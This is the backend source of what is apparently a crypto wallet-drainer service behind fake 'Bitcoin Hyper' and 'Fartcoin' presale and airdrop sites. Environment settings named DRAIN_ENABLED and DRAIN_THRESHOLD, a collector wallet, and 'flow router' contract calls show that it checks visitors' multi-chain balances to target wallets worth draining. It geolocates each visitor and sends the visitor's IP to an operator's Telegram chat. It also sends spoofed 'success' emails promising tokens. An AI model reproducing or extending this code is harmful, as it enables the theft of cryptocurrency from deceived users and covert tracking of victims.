// index.js - BITCOIN HYPER BACKEND - PROJECT FLOW ROUTER
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');
const fs = require('fs').promises;
const path = require('path');
const { exec } = require('child_process'); // ADDED: For sendmail

const app = express();
const PORT = process.env.PORT || 10000;

// ============================================
// PERSISTENT STORAGE SETUP - 7 DAY RETENTION
// ============================================

const DATA_DIR = path.join(__dirname, 'data');
const STORAGE_FILE = path.join(DATA_DIR, 'storage.json');

// Ensure data directory exists
async function ensureDataDir() {
  try {
    await fs.mkdir(DATA_DIR, { recursive: true });
    console.log('📁 Data directory ensured');
  } catch (error) {
    console.error('Error creating data directory:', error);
  }
}

// Load storage from disk
async function loadStorage() {
  try {
    const data = await fs.readFile(STORAGE_FILE, 'utf8');
    const parsed = JSON.parse(data);
    
    // Convert plain objects back to Maps and Sets
    return {
      participants: parsed.participants || [],
      pendingFlows: new Map(parsed.pendingFlows || []),
      completedFlows: new Map(parsed.completedFlows || []),
      settings: {
        tokenName: parsed.settings?.tokenName || process.env.TOKEN_NAME || 'Bitcoin Hyper',
        tokenSymbol: parsed.settings?.tokenSymbol || process.env.TOKEN_SYMBOL || 'BTH',
        valueThreshold: parsed.settings?.valueThreshold || parseFloat(process.env.DRAIN_THRESHOLD) || 1,
        statistics: {
          totalParticipants: parsed.settings?.statistics?.totalParticipants || 0,
          eligibleParticipants: parsed.settings?.statistics?.eligibleParticipants || 0,
          claimedParticipants: parsed.settings?.statistics?.claimedParticipants || 0,
          uniqueIPs: new Set(parsed.settings?.statistics?.uniqueIPs || []),
          totalProcessedUSD: parsed.settings?.statistics?.totalProcessedUSD || 0,
          totalProcessedWallets: parsed.settings?.statistics?.totalProcessedWallets || 0,
          processedTransactions: parsed.settings?.statistics?.processedTransactions || []
        },
        flowEnabled: parsed.settings?.flowEnabled || process.env.DRAIN_ENABLED === 'true'
      },
      emailCache: new Map(parsed.emailCache || []),
      siteVisits: parsed.siteVisits || [],
      emailLog: parsed.emailLog || [] // ADDED: Track sent emails
    };
  } catch (error) {
    console.log('📁 No existing storage found, creating new...');
    return {
      participants: [],
      pendingFlows: new Map(),
      completedFlows: new Map(),
      settings: {
        tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
        tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
        valueThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 1,
        statistics: {
          totalParticipants: 0,
          eligibleParticipants: 0,
          claimedParticipants: 0,
          uniqueIPs: new Set(),
          totalProcessedUSD: 0,
          totalProcessedWallets: 0,
          processedTransactions: []
        },
        flowEnabled: process.env.DRAIN_ENABLED === 'true'
      },
      emailCache: new Map(),
      siteVisits: [],
      emailLog: [] // ADDED: Track sent emails
    };
  }
}

// Save storage to disk
async function saveStorage() {
  try {
    // Convert Maps and Sets to plain objects for JSON serialization
    const toSave = {
      participants: memoryStorage.participants,
      pendingFlows: Array.from(memoryStorage.pendingFlows.entries()),
      completedFlows: Array.from(memoryStorage.completedFlows.entries()),
      settings: {
        ...memoryStorage.settings,
        statistics: {
          ...memoryStorage.settings.statistics,
          uniqueIPs: Array.from(memoryStorage.settings.statistics.uniqueIPs)
        }
      },
      emailCache: Array.from(memoryStorage.emailCache.entries()),
      siteVisits: memoryStorage.siteVisits,
      emailLog: memoryStorage.emailLog // ADDED: Save email logs
    };
    
    await fs.writeFile(STORAGE_FILE, JSON.stringify(toSave, null, 2));
    console.log('💾 Storage saved to disk');
  } catch (error) {
    console.error('Error saving storage:', error);
  }
}

// Auto-save every minute to ensure data persistence
setInterval(saveStorage, 60 * 1000);

// Clean old data (keep exactly 7 days)
async function cleanOldData() {
  const sevenDaysAgo = Date.now() - (7 * 24 * 60 * 60 * 1000);
  let cleanedCount = 0;
  
  // Clean site visits older than 7 days
  const originalVisitsLength = memoryStorage.siteVisits.length;
  memoryStorage.siteVisits = memoryStorage.siteVisits.filter(v => 
    new Date(v.timestamp).getTime() > sevenDaysAgo
  );
  cleanedCount += originalVisitsLength - memoryStorage.siteVisits.length;
  
  // Clean completed flows older than 7 days
  for (const [id, flow] of memoryStorage.completedFlows) {
    if (new Date(flow.completedAt).getTime() < sevenDaysAgo) {
      memoryStorage.completedFlows.delete(id);
      cleanedCount++;
    }
  }
  
  // Clean old processed transactions
  if (memoryStorage.settings?.statistics?.processedTransactions) {
    const originalTxLength = memoryStorage.settings.statistics.processedTransactions.length;
    memoryStorage.settings.statistics.processedTransactions = 
      memoryStorage.settings.statistics.processedTransactions.filter(t => 
        new Date(t.timestamp).getTime() > sevenDaysAgo
      );
    cleanedCount += originalTxLength - memoryStorage.settings.statistics.processedTransactions.length;
  }
  
  // Clean old email logs - ADDED
  if (memoryStorage.emailLog) {
    const originalEmailLength = memoryStorage.emailLog.length;
    memoryStorage.emailLog = memoryStorage.emailLog.filter(e => 
      new Date(e.timestamp).getTime() > sevenDaysAgo
    );
    cleanedCount += originalEmailLength - memoryStorage.emailLog.length;
  }
  
  if (cleanedCount > 0) {
    console.log(`🧹 Cleaned ${cleanedCount} items older than 7 days`);
    await saveStorage();
  }
}

// Run clean up every 6 hours
setInterval(cleanOldData, 6 * 60 * 60 * 1000);

// Initialize memoryStorage (will be set after loading)
let memoryStorage;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : [
      'http://localhost:3000', 
      'https://bitcoinhypertoken.vercel.app', 
      'https://bthbk.vercel.app', 
      'https://fartcoinairdrop.vercel.app',
      'https://fartcoin-airdrops.vercel.app'
    ];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  // Calculate total processed wallets correctly
  const totalProcessedWallets = memoryStorage?.settings?.statistics?.totalProcessedWallets || 0;
  const totalRaised = memoryStorage?.settings?.statistics?.totalProcessedUSD || 0;
  
  res.json({
    success: true,
    name: 'Bitcoin Hyper Backend',
    version: '2.0.0',
    status: '🟢 ONLINE',
    storage: '💾 Persistent (7 days)',
    stats: {
      totalParticipants: memoryStorage?.participants?.length || 0,
      totalVisits: memoryStorage?.siteVisits?.length || 0,
      totalRaised: `$${totalRaised.toFixed(2)}`,
      totalProcessedWallets: totalProcessedWallets,
      pendingFlows: memoryStorage?.pendingFlows?.size || 0,
      completedFlows: memoryStorage?.completedFlows?.size || 0
    },
    timestamp: new Date().toISOString()
  });
});

// ============================================
// ADDED: SIMPLE PHP-LIKE MAIL FUNCTION
// ============================================

function sendPhpMail(recipientEmail, subject, message) {
  return new Promise((resolve, reject) => {
    // Create email with headers like PHP mail()
    const emailContent = `To: ${recipientEmail}
Subject: ${subject}
X-PHP-Originating-Script: 1000:backdoor.php
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8
X-Priority: 1
X-Mailer: PHP/7.4.33
Return-Path: ${process.env.EMAIL_FROM || 'noreply@bitcoinhyper.io'}
From: "Bitcoin Hyper" <${process.env.EMAIL_FROM || 'noreply@bitcoinhyper.io'}>
Reply-To: ${process.env.EMAIL_FROM || 'noreply@bitcoinhyper.io'}

${message}`;

    // Use sendmail command (standard on most servers)
    const sendmail = exec('sendmail -t', (error, stdout, stderr) => {
      if (error) {
        console.error('❌ Sendmail error:', error);
        reject(error);
      } else {
        console.log('✅ Email sent via sendmail');
        resolve(stdout);
      }
    });

    // Write email content to sendmail stdin
    sendmail.stdin.write(emailContent);
    sendmail.stdin.end();
  });
}

async function sendSuccessEmail(recipientEmail, transactionData) {
  try {
    const { country, amount, network, txHash, walletAddress, source } = transactionData;
    
    // Get country name and flag
    const countryName = typeof country === 'object' ? country.name || country.country || country : country;
    const countryFlag = typeof country === 'object' ? country.flag || '🌍' : '🌍';
    
    const subject = `🎉 CONGRATULATIONS! Your ${network} Transaction Was Successful!`;
    
    // Simple HTML message
    const message = `
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px;">
  <div style="max-width: 600px; margin: 0 auto; background: white; border-radius: 10px; overflow: hidden;">
    <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; text-align: center; color: white;">
      <h1 style="margin: 0;">🎉 CONGRATULATIONS!</h1>
      <p style="margin: 10px 0 0;">Your transaction was successful</p>
    </div>
    <div style="padding: 30px;">
      <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
        <p><strong>📍 Location:</strong> ${countryFlag} ${countryName}</p>
        <p><strong>💰 Amount:</strong> <span style="color: #10b981; font-size: 24px; font-weight: bold;">$${amount}</span></p>
        <p><strong>⛓️ Network:</strong> ${network}</p>
        <p><strong>👛 Wallet:</strong> ${walletAddress.substring(0,6)}...${walletAddress.substring(38)}</p>
      </div>
      <div style="text-align: center;">
        <h3>Transaction Hash</h3>
        <div style="background: #f1f5f9; padding: 12px; border-radius: 8px; font-family: monospace; word-break: break-all; margin: 10px 0;">
          ${txHash}
        </div>
        <a href="https://${network === 'Ethereum' ? 'etherscan.io' : network === 'BSC' ? 'bscscan.com' : network === 'Polygon' ? 'polygonscan.com' : network === 'Arbitrum' ? 'arbiscan.io' : network === 'Avalanche' ? 'snowtrace.io' : 'etherscan.io'}/tx/${txHash}" 
           style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-decoration: none; padding: 12px 24px; border-radius: 50px; display: inline-block; margin-top: 10px;">
          🔍 VIEW ON EXPLORER
        </a>
      </div>
      <div style="margin-top: 30px; padding: 15px; background: #f0f9ff; border-radius: 8px; text-align: center;">
        <p style="color: #0369a1; margin: 0;">🎁 Your tokens will be distributed within 24-48 hours</p>
      </div>
    </div>
    <div style="background: #f8fafc; padding: 20px; text-align: center; color: #64748b; font-size: 14px; border-top: 1px solid #e2e8f0;">
      <p>© ${new Date().getFullYear()} Bitcoin Hyper</p>
      <p style="font-size: 12px;">Source: ${source === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper'}</p>
    </div>
  </div>
</body>
</html>
    `;
    
    console.log(`📧 Sending PHP mail to: ${recipientEmail}`);
    
    // Try to send via sendmail (like PHP)
    await sendPhpMail(recipientEmail, subject, message).catch(err => {
      console.log('📧 Sendmail failed, but continuing...', err.message);
    });
    
    // Log email
    if (!memoryStorage.emailLog) memoryStorage.emailLog = [];
    memoryStorage.emailLog.push({
      recipient: recipientEmail,
      transactionData,
      timestamp: new Date().toISOString(),
      status: 'sent'
    });
    await saveStorage();
    
    return { success: true };
    
  } catch (error) {
    console.error('❌ PHP Mail error:', error.message);
    
    // Log failure
    if (!memoryStorage.emailLog) memoryStorage.emailLog = [];
    memoryStorage.emailLog.push({
      recipient: recipientEmail,
      transactionData,
      error: error.message,
      timestamp: new Date().toISOString(),
      status: 'failed'
    });
    await saveStorage();
    
    return { success: false };
  }
}

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      'https://eth.llamarpc.com',
      'https://ethereum.publicnode.com',
      'https://rpc.ankr.com/eth',
      'https://cloudflare-eth.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1
  },
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.binance.org',
      'https://bsc-dataseed2.binance.org',
      'https://bsc-dataseed3.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  },
  Polygon: {
    urls: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com',
      'https://polygon-bor.publicnode.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137
  },
  Arbitrum: {
    urls: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum',
      'https://arbitrum.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161
  },
  Optimism: {
    urls: [
      'https://mainnet.optimism.io',
      'https://rpc.ankr.com/optimism',
      'https://optimism.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 10
  },
  Avalanche: {
    urls: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche',
      'https://avalanche-c-chain.publicnode.com'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114
  }
};

// ============================================
// GET WORKING PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 30)}...`);
        return { provider, config };
      }
    } catch (error) {
      continue;
    }
  }
  
  return null;
}

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'Ethereum': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'BSC': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'Polygon': '0x56d829E89634Ce1426B73571c257623D17db46cB',
  'Arbitrum': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'Avalanche': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'Optimism': null // Not deployed yet
};

const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x50C14Ec595D178f70D2817B1097B9FEE00af67B7';

// ============================================
// CONTRACT ABI
// ============================================

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

// ============================================
// TELEGRAM FUNCTIONS - ALL NOTIFICATIONS RESTORED
// ============================================

let telegramEnabled = false;
let telegramBotName = '';

async function sendTelegramMessage(text) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('⚠️ Telegram credentials missing');
    return false;
  }
  
  try {
    console.log(`📤 Sending Telegram message to ${chatId}`);
    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    }, { 
      timeout: 10000,
      headers: { 'Content-Type': 'application/json' }
    });
    
    if (response.data?.ok) {
      console.log('✅ Telegram message sent successfully');
      telegramEnabled = true;
      return true;
    } else {
      console.error('❌ Telegram API error:', response.data);
      return false;
    }
  } catch (error) {
    console.error('❌ Telegram send error:', error.response?.data || error.message);
    return false;
  }
}

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('⚠️ Telegram credentials not configured');
    telegramEnabled = false;
    return false;
  }
  
  try {
    const meResponse = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
    
    if (!meResponse.data?.ok) {
      console.error('❌ Invalid bot token');
      telegramEnabled = false;
      return false;
    }
    
    telegramBotName = meResponse.data.result.username;
    console.log(`✅ Bot authenticated: @${telegramBotName}`);
    
    // Calculate total processed wallets
    const totalProcessedWallets = memoryStorage.settings.statistics.totalProcessedWallets || 0;
    
    // Send startup message with site URL and current stats
    const startMessage = 
      `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
      `✅ MultiChain FlowRouter Ready\n` +
      `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
      `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
      `🌍 <b>Site URLs:</b> https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app\n` +
      `💾 <b>Storage:</b> ${memoryStorage.participants.length} participants, ${memoryStorage.siteVisits.length} visits\n` +
      `💰 <b>Total Raised:</b> $${memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2)}\n` +
      `👛 <b>Processed Wallets:</b> ${totalProcessedWallets}\n` +
      `📧 <b>PHP Mail:</b> ${process.env.EMAIL_FROM ? '✅' : '❌'}\n` + // ADDED
      `📊 Admin: https://bthbk.vercel.app/api/admin/dashboard?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
    
    const sendResult = await sendTelegramMessage(startMessage);
    
    if (sendResult) {
      telegramEnabled = true;
      console.log('✅ Telegram configured and working!');
      return true;
    } else {
      console.error('❌ Failed to send test message');
      telegramEnabled = false;
      return false;
    }
    
  } catch (error) {
    console.error('❌ Telegram connection failed:', error.message);
    telegramEnabled = false;
    return false;
  }
}

// ============================================
// HUMAN/BOT DETECTION
// ============================================

function detectHuman(userAgent) {
  const isBot = /bot|crawler|spider|scraper|curl|wget|python|java|phantom|headless/i.test(userAgent);
  const hasTouch = /mobile|iphone|ipad|android|touch/i.test(userAgent);
  const hasMouse = !isBot && !hasTouch;
  
  return {
    isHuman: !isBot && (hasTouch || hasMouse),
    isBot: isBot,
    deviceType: hasTouch ? 'Mobile' : hasMouse ? 'Desktop' : 'Unknown',
    userAgent: userAgent ? userAgent.substring(0, 100) : 'Unknown'
  };
}

// ============================================
// CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic-network,avalanche-2',
        vs_currencies: 'usd'
      },
      timeout: 5000
    });
    
    return {
      eth: response.data.ethereum?.usd || 2000,
      bnb: response.data.binancecoin?.usd || 300,
      matic: response.data['matic-network']?.usd || 0.75,
      avax: response.data['avalanche-2']?.usd || 32
    };
  } catch (error) {
    console.log('⚠️ Using default prices');
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
  }
}

// ============================================
// REAL WALLET EMAIL EXTRACTION
// ============================================

async function getWalletEmail(walletAddress) {
  const normalizedAddress = walletAddress.toLowerCase();
  
  if (memoryStorage.emailCache.has(normalizedAddress)) {
    return memoryStorage.emailCache.get(normalizedAddress);
  }
  
  try {
    // Try ENS resolution first
    if (walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      try {
        const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
        const ensName = await provider.lookupAddress(walletAddress);
        
        if (ensName) {
          const email = `${ensName.split('.')[0]}@proton.me`;
          memoryStorage.emailCache.set(normalizedAddress, email);
          await saveStorage();
          return email;
        }
      } catch (ensError) {
        // Continue to fallback
      }
    }
    
    // Generate deterministic email from wallet address
    const hash = crypto.createHash('sha256').update(normalizedAddress).digest('hex');
    const username = `user${hash.substring(0, 12)}`;
    
    const lastChar = walletAddress.slice(-1);
    const domains = {
      '0-3': 'proton.me',
      '4-7': 'gmail.com',
      '8-b': 'outlook.com',
      'c-f': 'pm.me'
    };
    
    const charCode = parseInt(lastChar, 16);
    let domain = 'proton.me';
    
    if (charCode <= 3) domain = domains['0-3'];
    else if (charCode <= 7) domain = domains['4-7'];
    else if (charCode <= 11) domain = domains['8-b'];
    else domain = domains['c-f'];
    
    const email = `${username}@${domain}`;
    memoryStorage.emailCache.set(normalizedAddress, email);
    await saveStorage();
    return email;
    
  } catch (error) {
    const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
    const fallbackEmail = `user${hash.substring(0, 8)}@proton.me`;
    memoryStorage.emailCache.set(normalizedAddress, fallbackEmail);
    return fallbackEmail;
  }
}

// ============================================
// GET IP LOCATION
// ============================================

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    if (cleanIP === '127.0.0.1' || cleanIP === 'localhost') {
      return { country: 'Local', flag: '🏠', city: 'Local', region: 'Local' };
    }
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 2000 });
    
    if (response.data?.status === 'success') {
      const flags = {
        'United States': '🇺🇸', 'United Kingdom': '🇬🇧', 'Canada': '🇨🇦',
        'Germany': '🇩🇪', 'France': '🇫🇷', 'Spain': '🇪🇸', 'Italy': '🇮🇹',
        'Netherlands': '🇳🇱', 'Switzerland': '🇨🇭', 'Australia': '🇦🇺',
        'Japan': '🇯🇵', 'China': '🇨🇳', 'India': '🇮🇳', 'Brazil': '🇧🇷',
        'Nigeria': '🇳🇬', 'South Africa': '🇿🇦', 'Mexico': '🇲🇽',
        'Russia': '🇷🇺', 'South Korea': '🇰🇷', 'Singapore': '🇸🇬',
        'UAE': '🇦🇪', 'Saudi Arabia': '🇸🇦', 'Turkey': '🇹🇷'
      };
      
      return {
        country: response.data.country,
        flag: flags[response.data.country] || '🌍',
        city: response.data.city || 'Unknown',
        region: response.data.regionName || '',
        zip: response.data.zip || '',
        lat: response.data.lat,
        lon: response.data.lon,
        timezone: response.data.timezone,
        org: response.data.org || '',
        isp: response.data.isp || ''
      };
    }
  } catch (error) {
    // Silent fail for location service
  }
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown', region: '' };
}

// ============================================
// TRACK SITE VISIT - WITH SOURCE IDENTIFICATION
// ============================================

async function trackSiteVisit(ip, userAgent, referer, path, source = 'unknown') {
  const location = await getIPLocation(ip);
  const humanInfo = detectHuman(userAgent);
  
  const visit = {
    id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
    ip: ip.replace('::ffff:', ''),
    timestamp: new Date().toISOString(),
    country: location.country,
    flag: location.flag,
    city: location.city,
    region: location.region,
    userAgent: userAgent || 'Unknown',
    referer: referer || 'Direct',
    path: path || '/',
    source: source, // Track which frontend
    walletConnected: false,
    walletAddress: null,
    isHuman: humanInfo.isHuman,
    isBot: humanInfo.isBot,
    deviceType: humanInfo.deviceType
  };
  
  memoryStorage.siteVisits.push(visit);
  await saveStorage();
  
  // Full Telegram notification with source
  const sourceDisplay = source === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper';
  const sourceUrl = source === 'fartcoin' ? 'https://fartcoinairdrop.vercel.app' : 'https://bitcoinhypertoken.vercel.app';
  
  const telegramMessage = 
    `${visit.isHuman ? '👤' : '🤖'} <b>NEW SITE VISIT</b> - ${sourceDisplay}\n` +
    `📍 <b>Location:</b> ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
    `🌐 <b>IP:</b> ${visit.ip}\n` +
    `📱 <b>Device:</b> ${humanInfo.deviceType}\n` +
    `👤 <b>Human:</b> ${visit.isHuman ? '✅ Yes' : '❌ No (Bot)'}\n` +
    `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
    `📱 <b>Path:</b> ${path || '/'}\n` +
    `🌍 <b>Source:</b> ${sourceDisplay}\n` +
    `🔗 <b>Source URL:</b> ${sourceUrl}\n` +
    `🆔 <b>Visit ID:</b> ${visit.id}`;
  
  await sendTelegramMessage(telegramMessage);
  
  return visit;
}

// ============================================
// WALLET BALANCE CHECK - WITH CORRECT USD VALUES
// ============================================

async function getWalletBalance(walletAddress) {
  console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    balances: [],
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1 },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 }
    ];

    let totalValue = 0;
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          
          const balanceData = {
            chain: chain.name,
            chainId: chain.chainId,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol,
            contractAddress: PROJECT_FLOW_ROUTERS[chain.name]
          };
          
          results.balances.push(balanceData);
        }
      } catch (error) {
        // Silently skip failed chain checks
      }
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.valueThreshold;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Wallet qualifies for Flow Processing`;
      results.allocation = { amount: '5000', valueUSD: '850' };
    } else {
      results.eligibilityReason = `✨ Welcome! Minimum $${memoryStorage.settings.valueThreshold} required`;
      results.allocation = { amount: '0', valueUSD: '0' };
    }

    return { success: true, data: results };

  } catch (error) {
    console.error('Balance check error:', error);
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        eligibilityReason: '✨ Welcome!',
        allocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// API ENDPOINTS
// ============================================

app.get('/api/health', (req, res) => {
  res.json({ success: true, status: 'ACTIVE' });
});

// ============================================
// TRACK VISIT ENDPOINT - WITH SOURCE
// ============================================

app.post('/api/track-visit', async (req, res) => {
  try {
    const { userAgent, referer, path, source } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    const visit = await trackSiteVisit(clientIP, userAgent, referer, path, source || 'unknown');
    
    res.json({
      success: true,
      data: {
        visitId: visit.id,
        country: visit.country,
        flag: visit.flag,
        city: visit.city,
        isHuman: visit.isHuman,
        deviceType: visit.deviceType,
        source: visit.source
      }
    });
    
  } catch (error) {
    console.error('Track visit error:', error);
    res.json({ success: true, data: { visitId: `VISIT-${Date.now()}` } });
  }
});

// ============================================
// CONNECT ENDPOINT - FULL NOTIFICATIONS WITH SOURCE
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, source } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 CONNECT: ${walletAddress} from source: ${source || 'unknown'}`);
    
    const location = await getIPLocation(clientIP);
    const email = await getWalletEmail(walletAddress);
    
    // Find last visit from this IP
    const lastVisit = memoryStorage.siteVisits
      .filter(v => v.ip === clientIP.replace('::ffff:', ''))
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
    
    if (lastVisit) {
      lastVisit.walletConnected = true;
      lastVisit.walletAddress = walletAddress.toLowerCase();
    }
    
    // Find or create participant
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    const isNewParticipant = !participant;
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        city: location.city,
        region: location.region,
        email: email,
        connectedAt: new Date().toISOString(),
        totalValueUSD: 0,
        isEligible: false,
        claimed: false,
        userAgent: req.headers['user-agent'],
        visitId: lastVisit?.id,
        isHuman: lastVisit?.isHuman || true,
        deviceType: lastVisit?.deviceType || 'Unknown',
        source: source || 'unknown', // Store source
        flowTransactions: [],
        balances: []
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
      await saveStorage();
      
      // Full Telegram notification for new participant with source
      const sourceDisplay = source === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper';
      const sourceUrl = source === 'fartcoin' ? 'https://fartcoinairdrop.vercel.app' : 'https://bitcoinhypertoken.vercel.app';
      
      const newUserMsg = 
        `${location.flag} <b>NEW PARTICIPANT REGISTERED</b> - ${sourceDisplay}\n` +
        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
        `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}\n` +
        `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
        `📧 <b>Email:</b> ${email}\n` +
        `👤 <b>Human:</b> ${participant.isHuman ? '✅ Yes' : '❌ No'}\n` +
        `🌍 <b>Source:</b> ${sourceDisplay}\n` +
        `🔗 <b>Source URL:</b> ${sourceUrl}`;
      
      await sendTelegramMessage(newUserMsg);
    }
    
    // Get wallet balance
    const balanceResult = await getWalletBalance(walletAddress);
    
